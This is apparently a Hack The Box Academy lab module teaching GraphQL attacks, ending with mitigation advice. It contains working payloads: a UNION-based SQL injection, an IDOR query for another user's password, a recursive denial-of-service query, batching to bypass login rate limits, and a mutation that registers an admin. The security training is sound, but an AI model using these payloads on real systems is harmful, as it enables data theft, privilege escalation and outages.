# Introduction to GraphQL

* * *

[GraphQL](https://graphql.org/) is a query language typically used by web APIs as an alternative to REST. It enables the client to fetch required data through a simple syntax while providing a wide variety of features typically provided by query languages, such as SQL. Like REST APIs, GraphQL APIs can read, update, create, or delete data. However, GraphQL APIs are typically implemented on a single endpoint that handles all queries. As such, one of the main benefits of using GraphQL over traditional REST APIs is efficiency in using resources and requests.

* * *

## Basic Overview

A GraphQL service typically runs on a single endpoint to receive queries. Most commonly, the endpoint is located at `/graphql`, `/api/graphql`, or something similar. For frontend web applications to use this GraphQL endpoint, it needs to be exposed. Just like REST APIs, we can, however, interact with the GraphQL endpoint directly without going through the frontend web application to identify security vulnerabilities.

From an abstract point of view, GraphQL queries select `fields` of objects. Each object is of a specific `type` defined by the backend. The query is structured according to GraphQL syntax, with the name of the `query` to run at the root. For instance, we can query the `id`, `username`, and `role` fields of all `User` objects by running the `users` query:

```graphql
{
  users {
    id
    username
    role
  }
}

```

The resulting GraphQL response is structured in the same way and might look something like this:

```graphql
{
  "data": {
    "users": [
      {
        "id": 1,
        "username": "htb-stdnt",
        "role": "user"
      },
      {
        "id": 2,
        "username": "admin",
        "role": "admin"
      }
    ]
  }
}

```

If a query supports arguments, we can add a supported argument to filter the query results. For instance, if the query `users` supports the `username` argument, we can query a specific user by supplying their username:

```graphql
{
  users(username: "admin") {
    id
    username
    role
  }
}

```

We can add or remove fields from the query we are interested in. For instance, if we are not interested in the `role` field and instead want to obtain the user's password, we can adjust the query accordingly:

```graphql
{
  users(username: "admin") {
    id
    username
    password
  }
}

```

Furthermore, GraphQL queries support sub-querying, which enables a query to obtain details from an object referencing another object. For instance, assume that a `posts` query returns a field `author` that holds a user object. We can then query the username and role of the `author` in our query like so:

```graphql
{
  posts {
    title
    author {
      username
      role
    }
  }
}

```

The result contains the `title` of all posts as well as the queried data of the corresponding author:

```graphql
{
  "data": {
    "posts": [
      {
        "title": "Hello World!",
        "author": {
          "username": "htb-stdnt",
          "role": "user"
        }
      },
      {
        "title": "Test",
        "author": {
          "username": "test",
          "role": "user"
        }
      }
    ]
  }
}

```

GraphQL queries support much more complex operations. However, this introductory overview is sufficient for this module. For more details, check out the [Learn](https://graphql.org/learn/) section on the official GraphQL website.


# Information Disclosure

* * *

Exploiting any service requires thorough enumeration and reconnaissance to identify all possible attack vectors. As attackers, we aim to obtain as much information about a service as possible.

* * *

## Identifying the GraphQL Engine

After logging in to the sample web application and investigating all functionality, we can observe multiple requests to the `/graphql` endpoints that contain GraphQL queries:

![image](https://academy.hackthebox.com/storage/modules/271/info_1.png)

Thus, we can definitively say that the web application implements GraphQL. As a first step, we will identify the GraphQL engine used by the web application using the tool [graphw00f](https://github.com/dolevf/graphw00f). Graphw00f will send various GraphQL queries, including malformed queries, and can determine the GraphQL engine by observing the backend's behavior and error messages in response to these queries.

After cloning the git repository, we can run the tool using the `main.py` Python script. We will run the tool in fingerprint ( `-f`) and detect mode ( `-d`). We can provide the web application's base URL to let graphwoof attempt to find the GraphQL endpoint by itself:

```shell
python3 main.py -d -f -t http://172.17.0.2

                +-------------------+
                |     graphw00f     |
                +-------------------+
                  ***            ***
                **                  **
              **                      **
    +--------------+              +--------------+
    |    Node X    |              |    Node Y    |
    +--------------+              +--------------+
                  ***            ***
                     **        **
                       **    **
                    +------------+
                    |   Node Z   |
                    +------------+

                graphw00f - v1.1.17
          The fingerprinting tool for GraphQL
           Dolev Farhi <[email protected]>

[*] Checking http://172.17.0.2/
[*] Checking http://172.17.0.2/graphql
[!] Found GraphQL at http://172.17.0.2/graphql
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
[!] Technologies: Python
[!] Homepage: https://graphene-python.org
[*] Completed.

```

As we can see, the graphwoof identified the GraphQL engine `Graphene`. Additionally, it provides us with the corresponding detailed page in the [GraphQL-Threat-Matrix](https://github.com/nicholasaleks/graphql-threat-matrix), which provides more in-depth information about the identified GraphQL engine:

![](https://academy.hackthebox.com/storage/modules/271/info_2.png)

Lastly, by accessing the `/graphql` endpoint in a web browser directly, we can see that the web application runs a [graphiql](https://github.com/graphql/graphiql) interface. This enables us to provide GraphQL queries directly, which is a lot more convenient than running the queries through Burp, as we do not need to worry about breaking the JSON syntax.

* * *

## Introspection

[Introspection](https://graphql.org/learn/introspection/) is a GraphQL feature that enables users to query the GraphQL API about the structure of the backend system. As such, users can use introspection queries to obtain all queries supported by the API schema. These introspection queries query the `__schema` field.

For instance, we can identify all GraphQL types supported by the backend using the following query:

```graphql
{
  __schema {
    types {
      name
    }
  }
}

```

The results contain basic default types, such as `Int` or `Boolean`, but also all custom types, such as `UserObject`:

![](https://academy.hackthebox.com/storage/modules/271/info_3.png)

Now that we know a type, we can follow up and obtain the name of all of the type's fields with the following introspection query:

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

```

In the result, we can see details we would expect from a user object, such as `username` and `password`, as well as their data types:

![](https://academy.hackthebox.com/storage/modules/271/info_4.png)

Furthermore, we can obtain all the queries supported by the backend using this query:

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}

```

Knowing all supported queries helps us identify potential attack vectors that we can use to obtain sensitive information. Lastly, we can use the following "general" introspection query that dumps all information about types, fields, and queries supported by the backend:

```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description

          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description

      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }

```

The result of this query is quite large and complex. However, we can visualize the schema using the tool [GraphQL-Voyager](https://github.com/graphql-kit/graphql-voyager). For this module, we will use the [GraphQL Demo](https://graphql-kit.com/graphql-voyager/). However, in a real engagement, we should follow the GitHub instructions to host the tool ourselves so that we can ensure that no sensitive information leaves our system.

In the demo, we can click `CHANGE SCHEMA` and select `INTROSPECTION`. After pasting the result of the above introspection query in the text field and clicking on `DISPLAY`, the backend's GraphQL schema is visualized for us. We can explore all supported queries, types, and fields:

![](https://academy.hackthebox.com/storage/modules/271/info_5.png)


# Insecure Direct Object Reference (IDOR)

* * *

Like REST APIs, broken authorization, particularly Insecure Direct Object Reference (IDOR) vulnerabilities, are common security issues in GraphQL. To learn more about IDOR vulnerabilities, check out the [Web Attacks](https://academy.hackthebox.com/module/details/134) module.

* * *

## Identifying IDOR

To identify issues regarding broken authorization, we first need to identify potential attack points that would enable us to access data we are not authorized to access. Enumerating the web application, we can observe that the following GraphQL query is sent when we access our user profile:

![image](https://academy.hackthebox.com/storage/modules/271/idor_1.png)

As we can see, user data is queried for the username provided in the query. While the web application automatically queries the data for the user we logged in with, we should check if we can access other user's data. To do so, let us provide a different username we know exists: `test`. Note that we need to escape the double quotes inside the GraphQL query to not break the JSON syntax:

![image](https://academy.hackthebox.com/storage/modules/271/idor_2.png)

As we can see, we can query the user `test`'s data without any additional authorization checks. Thus, we successfully confirmed a lack of authorization checks in this GraphQL query.

* * *

## Exploiting IDOR

To demonstrate the impact of this IDOR vulnerability, we need to determine what data we can access without authorization. To do so, we are going to use the following introspection queries to determine all fields of `User` type:

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

```

As we can see from the result, the `User` object contains a `password` field that, presumably, contains the user's password:

![image](https://academy.hackthebox.com/storage/modules/271/idor_3.png)

Let us adjust the initial GraphQL query to check if we can exploit the IDOR vulnerability to obtain another user's password by adding the `password` field in the GraphQL query:

```graphql
{
  user(username: "test") {
    username
    password
  }
}

```

From the result, we can see that we have successfully obtained the user's password:

![image](https://academy.hackthebox.com/storage/modules/271/idor_4.png)


# Injection Attacks

* * *

One of the most common web vulnerabilities are injection attacks such as [SQL Injection](https://academy.hackthebox.com/module/details/33), [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/details/103), and [Command Injection](https://academy.hackthebox.com/module/details/109). Like all web applications, GraphQL implementations can also suffer from these vulnerabilities.

* * *

## SQL Injection

Since GraphQL is a query language, the most common use case is fetching data from some kind of storage, typically a database. As SQL databases are one of the most predominant forms of databases, SQL injection vulnerabilities can inherently occur in GraphQL APIs that do not properly sanitize user input from arguments in the SQL queries executed by the backend. Therefore, we should carefully investigate all GraphQL queries, check whether they support arguments, and analyze these arguments for potential SQL injections.

Using the introspection query discussed earlier and some trial-and-error, we can identify that the backend supports the following queries that require arguments:

- `post`
- `user`
- `postByAuthor`

To identify if a query requires an argument, we can send the query without any arguments and analyze the response. If the backend expects an argument, the response contains an error that tells us the name of the required argument. For instance, the following error message tells us that the `postByAuthor` query requires the `author` argument:

![image](https://academy.hackthebox.com/storage/modules/271/sqli_1.png)

After supplying the `author` argument, the query is executed successfully:

![image](https://academy.hackthebox.com/storage/modules/271/sqli_2.png)

We can now investigate whether the `author` argument is vulnerable to SQL injection. For instance, if we try a basic SQL injection payload, the query does not return any result:

![image](https://academy.hackthebox.com/storage/modules/271/sqli_3.png)

Let us move on to the `user` query. If we try the same payload there, the query still returns the previous result, indicating a SQL injection vulnerability:

![image](https://academy.hackthebox.com/storage/modules/271/sqli_4.png)

If we simply inject a single quote, the response contains a SQL error, confirming the vulnerability:

![image](https://academy.hackthebox.com/storage/modules/271/sqli_5.png)

Since the SQL query is displayed in the SQL error, we can construct a UNION-based SQL injection query to exfiltrate data from the SQL database. Remember that the database might contain data that we cannot query from the GraphQL API. As such, we should check for any sensitive data in the database that we can access.

To construct a UNION-based SQL injection payload, let us take another look at the results of the introspection query:

![](https://academy.hackthebox.com/storage/modules/271/info_5.png)

The vulnerable `user` query returns a `UserObject`, so let us focus on that object. As we can see, the object consists of six fields and a link ( `posts`). The fields correspond to columns in the database table. As such, our UNION-based SQL injection payload needs to contain six columns to match the number of columns in the original query. Furthermore, the fields we specify in our GraphQL query correspond to the columns returned in the response. For instance, since the `username` is a `UserObject's` third field, querying for the `username` will result in the third column of our UNION-based payload being reflected in the response.

As the GraphQL query only returns the first row, we will use the [GROUP\_CONCAT](https://mariadb.com/kb/en/group_concat/) function to exfiltrate multiple rows at a time. This enables us to exfiltrate all table names in the current database with the following payload:

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}

```

The response contains all table names concatenated in the `username` field:

```graphql
{
  "data": {
    "user": {
      "username": "user,secret,post"
    }
  }
}

```

Since this is a SQL injection vulnerability just like in any other web application, we can use all SQL payloads and attack vectors to enumerate column names and finally exfiltrate data. For more details on exploiting SQL injections, check out the [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33) and [Advanced SQL Injections](https://academy.hackthebox.com/module/details/188) modules.

* * *

## Cross-Site Scripting (XSS)

XSS vulnerabilities can occur if GraphQL responses are inserted into the HTML page without proper sanitization. Similar to the above SQL injection vulnerability, we should investigate any GraphQL arguments for potential XSS injection points. However, in this case, both queries do not return an XSS payload:

![image](https://academy.hackthebox.com/storage/modules/271/xss_1.png)

XSS vulnerabilities can also occur if invalid arguments are reflected in error messages. Let us look at the `post` query, which expects an integer ID as an argument. If we instead submit a string argument containing an XSS payload, we can see that the XSS payload is reflected without proper encoding in the GraphQL error message:

![image](https://academy.hackthebox.com/storage/modules/271/xss_2.png)

However, if we attempt to trigger the URL from the corresponding GET-parameter by accessing the URL `/post?id=<script>alert(1)</script>`, we can observe that the page simply breaks, and the XSS payload is not triggered.


# Denial-of-Service (DoS) & Batching Attacks

* * *

Depending on the GraphQL API's configuration, we can create queries that result in exponentially large responses and require significant resources to process. This can lead to high hardware utilization on the backend system, potentially leading to a DoS scenario that limits the service's availability to other users.

* * *

## Denial-of-Service (DoS) Attacks

To execute a DoS attack, we must identify a way to construct a query that results in a large response. Let's look at the visualization of the introspection results in `GraphQL Voyager`. We can identify a loop between the `UserObject` and `PostObject` via the `author` and `posts` fields:

![](https://academy.hackthebox.com/storage/modules/271/info_5.png)

We can abuse this loop by constructing a query that queries the author of all posts. For each author, we then query the author of all posts again. If we repeat this many times, the result grows exponentially larger, potentially resulting in a DoS scenario.

Since the `posts` object is a `connection`, we need to specify the `edges` and `node` fields to obtain a reference to the corresponding `Post` object. As an example, let us query the author of all posts. From there, we will query all posts by each author and then the author's username for each of these posts:

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}

```

This is an infinite loop we can repeat as many times as we want. If we take a look at the result of this query, it is already quite large because the response grows exponentially larger with each iteration of the loop we query:

![](https://academy.hackthebox.com/storage/modules/271/dos_1.png)

Making our initial query large will slow down the server significantly, potentially causing availability issues for other users. For instance, the following query crashes the `GraphiQL` instance:

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              posts {
                edges {
                  node {
                    author {
                      posts {
                        edges {
                          node {
                            author {
                              posts {
                                edges {
                                  node {
                                    author {
                                      posts {
                                        edges {
                                          node {
                                            author {
                                              posts {
                                                edges {
                                                  node {
                                                    author {
                                                      posts {
                                                        edges {
                                                          node {
                                                            author {
                                                              posts {
                                                                edges {
                                                                  node {
                                                                    author {
                                                                      username
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

```

![](https://academy.hackthebox.com/storage/modules/271/dos_2.png)

* * *

## Batching Attacks

Batching in GraphQL refers to executing multiple queries with a single request. We can do so by directly supplying multiple queries in a JSON list in the HTTP request. For instance, we can query the ID of the user `admin` and the title of the first post in a single request:

```http
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Length: 86
Content-Type: application/json

[
	{
		"query":"{user(username: \"admin\") {uuid}}"
	},
	{
		"query":"{post(id: 1) {title}}"
	}
]

```

The response contains the requested information in the same structure we provided the query in:

![image](https://academy.hackthebox.com/storage/modules/271/batching_1.png)

Batching is not a security vulnerability but an intended feature that can be enabled or disabled. However, batching can lead to security issues if GraphQL queries are used for sensitive processes such as user login. Since batching enables an attacker to provide multiple GraphQL queries in a single request, it can potentially be used to conduct brute-force attacks with significantly fewer HTTP requests. This could lead to bypasses of security measures in place to prevent brute-force attacks, such as rate limits.

For instance, assume a web application uses GraphQL queries for user login. The GraphQL endpoint is protected by a rate limit, allowing only five requests per second. An attacker can brute-force user accounts with only five passwords per second. However, using GraphQL batching, an attacker can put multiple login queries into a single HTTP request. Assuming the attacker constructs an HTTP request containing 1000 different GraphQL login queries, the attacker can now brute-force user accounts with up to 5000 passwords per second, rendering the rate limit ineffective. Thus, GraphQL batching can enable powerful brute-force attacks.


# Mutations

* * *

In the `Introduction to GraphQL` section, we discussed various basic elements of GraphQL queries. However, you might have noticed that we only discussed ways to read data. Just like REST APIs, GraphQL provides a way to modify data as well. This is done through the use of `mutations`.

* * *

## What are mutations?

Mutations are GraphQL queries that modify server data. They can be used to create new objects, update existing objects, or delete existing objects.

Let us start by identifying all mutations supported by the backend and their arguments. We will use the following introspection query:

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

```

From the result, we can identify a mutation `registerUser`, presumably allowing us to create new users. The mutation requires a `RegisterUserInput` object as an input:

![](https://academy.hackthebox.com/storage/modules/271/mutation_1.png)

We can now query all fields of the `RegisterUserInput` object with the following introspection query to obtain all fields that we can use in the mutation:

```graphql
{
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}

```

From the result, we can identify that we can provide the new user's `username`, `password`, `role`, and `msg`:

![](https://academy.hackthebox.com/storage/modules/271/mutation_2.png)

As we identified earlier, we need to provide the password as an MD5-hash. To hash our password, we can use the following command:

```shell
echo -n 'password' | md5sum

5f4dcc3b5aa765d61d8327deb882cf99  -

```

With the hashed password, we can now finally register a new user by running the mutation:

```graphql
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}

```

The result contains the fields we queried in the mutation's body so that we can check for errors:

![](https://academy.hackthebox.com/storage/modules/271/mutation_3.png)

We can now successfully log in to the application with our newly registered user.

* * *

## Exploitation with Mutations

To identify potential attack vectors through mutations, we need to thoroughly examine all supported mutations and their inputs. In this case, we can provide the `role` argument for newly registered users, which might enable us to create users with a different role than the default role, potentially allowing us to escalate privileges.

We have identified the roles `user` and `admin` from querying all existing users. Let us create a new user with the role `admin` and check if this enables us to access the internal admin endpoint at `/admin`. We can use the following GraphQL mutation:

```graphql
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}

```

In the result, we can see that the role `admin` is reflected, which indicates that the attack was successful:

![](https://academy.hackthebox.com/storage/modules/271/mutation_4.png)

After logging in, we can now access the admin endpoint, meaning we have successfully escalated our privileges:

![](https://academy.hackthebox.com/storage/modules/271/mutation_5.png)


# Tools of the Trade

* * *

We have already discussed tools that can help us in the enumeration phase: [graphw00f](https://github.com/dolevf/graphw00f) and [graphql-voyager](https://github.com/graphql-kit/graphql-voyager). We will now discuss further tools to help us attack GraphQL APIs.

* * *

## GraphQL-Cop

We can use the tool [GraphQL-Cop](https://github.com/dolevf/graphql-cop), a security audit tool for GraphQL APIs. After cloning the GitHub repository and installing the required dependencies, we can run the `graphql-cop.py` Python script:

```shell
python3 graphql-cop.py  -v

version: 1.13

```

We can then specify the GraphQL API's URL with the `-t` flag. GraphQL-Cop then executes multiple basic security configuration checks and lists all identified issues, which is a great baseline for further manual tests:

```shell
python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql

[HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql)
[HIGH] Array-based Query Batching - Batch queries allowed with 10+ simultaneous queries (Denial of Service - /graphql)
[HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql)
[HIGH] Field Duplication - Queries are allowed with 500 of the same repeated field (Denial of Service - /graphql)
[LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql)
[MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql)
[LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql)
[HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql)
[MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)

```

* * *

## InQL

[InQL](https://github.com/doyensec/inql) is a Burp extension we can install via the `BApp Store` in Burp. After a successful installation, an `InQL` tab is added in Burp.

Furthermore, the extension adds `GraphQL` tabs in the Proxy History and Burp Repeater that enable simple modification of the GraphQL query without having to deal with the encompassing JSON syntax:

![image](https://academy.hackthebox.com/storage/modules/271/inql_1.png)

Furthermore, we can right-click on a GraphQL request and select `Extensions > InQL - GraphQL Scanner > Generate queries with InQL Scanner`:

![image](https://academy.hackthebox.com/storage/modules/271/inql_2.png)

Afterward, InQL generates introspection information. The information regarding all mutations and queries is provided in the `InQL` tab for the scanned host:

![image](https://academy.hackthebox.com/storage/modules/271/inql_3.png)

This is only a basic overview of InQL's functionality. Check out the official [GitHub repository](https://github.com/portswigger/inql) for more details.


# GraphQL Vulnerability Prevention

* * *

After discussing how to attack different vulnerabilities that arise from misconfigured GraphQL implementations, let's discuss mitigations to prevent these vulnerabilities.

* * *

## Vulnerability Prevention

### Information Disclosure

General security best practices apply to prevent information disclosure vulnerabilities. These include preventing verbose error messages and instead displaying generic error messages. Furthermore, introspection queries are potent tools for obtaining information. As such, they should be disabled if possible. At the very least, whether any sensitive information is disclosed in introspection queries should be checked. If this is the case, all sensitive information needs to be removed.

### Injection Attacks

Proper input validation checks need to be implemented to prevent any injection-type attacks such as SQL injection, command injection, or XSS. Any data the user supplies should be treated as untrusted before appropriate sanitization. The use of allowlists should be preferred over denylists.

### Denial-of-Service (DoS)

As discussed, DoS attacks and the amplification of brute-force attacks through batching are common GraphQL attack vectors. Proper limits need to be implemented to mitigate these types of attacks. This can include limits to the GraphQL query depth, limits to the maximum GraphQL query size, and rate limits on the GraphQL endpoint to prevent many subsequent queries in quick succession. Additionally, batching should be turned off in GraphQL queries if possible. If batching is required, the query depth needs to be limited.

### API Design

General API security best practices should be followed to prevent further attacks, such as attacks against improper access control (for instance, IDOR) or attacks resulting from improper authorization checks on mutations. This includes strict access control measures according to the principle of least privileges. In particular, the GraphQL endpoint should only be accessible after successful authentication, if possible, according to the API's use case. Furthermore, authorization checks must be implemented; preventing actors from executing queries or mutations they are not authorized to.

For more details on securing GraphQL APIs, check out OWASP's [GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html).


# Skills Assessment

* * *

## Scenario

You are tasked to perform a security assessment of a client's web application. Apply what you have learned in this module to obtain the flag.


